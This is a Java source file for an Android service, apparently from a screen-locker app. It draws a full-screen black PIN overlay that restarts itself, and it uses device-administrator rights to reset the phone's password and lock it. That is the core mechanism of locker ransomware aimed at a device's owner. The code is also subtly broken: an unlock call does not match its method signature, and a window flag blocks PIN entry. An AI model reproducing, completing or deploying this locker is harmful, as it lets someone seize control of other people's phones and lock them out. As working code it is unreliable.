package com.nullx.pp;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.view.WindowManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.graphics.Color;
import android.view.Gravity;
import android.view.ViewGroup;

public class LockOverlayService extends Service {
    private static WindowManager windowManager;
    private static LinearLayout overlayView;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        createOverlay();
        return START_STICKY;
    }

    private void createOverlay() {
        overlayView = new LinearLayout(this);
        overlayView.setBackgroundColor(Color.BLACK);
        overlayView.setOrientation(LinearLayout.VERTICAL);
        overlayView.setGravity(Gravity.CENTER);

        EditText pinInput = new EditText(this);
        pinInput.setHint("Enter PIN");
        pinInput.setTextColor(Color.WHITE);
        pinInput.setHintTextColor(Color.GRAY);
        pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);

        Button unlockBtn = new Button(this);
        unlockBtn.setText("UNLOCK");
        unlockBtn.setOnClickListener(v -> {
            if (pinInput.getText().toString().equals("1234")) {
                removeOverlay();
            } else {
                Toast.makeText(this, "Wrong PIN!", Toast.LENGTH_SHORT).show();
            }
        });

        overlayView.addView(pinInput);
        overlayView.addView(unlockBtn);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            android.graphics.PixelFormat.TRANSLUCENT
        );
        windowManager.addView(overlayView, params);
    }

    public static void removeOverlay(Context context) {
        if (overlayView != null && windowManager != null) {
            windowManager.removeView(overlayView);
            overlayView = null;
        }
    }

    public static void lockDevice(Context context, String pin) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, AutoAdminActivator.class);
        if (dpm.isAdminActive(admin)) {
            dpm.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            dpm.lockNow();
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}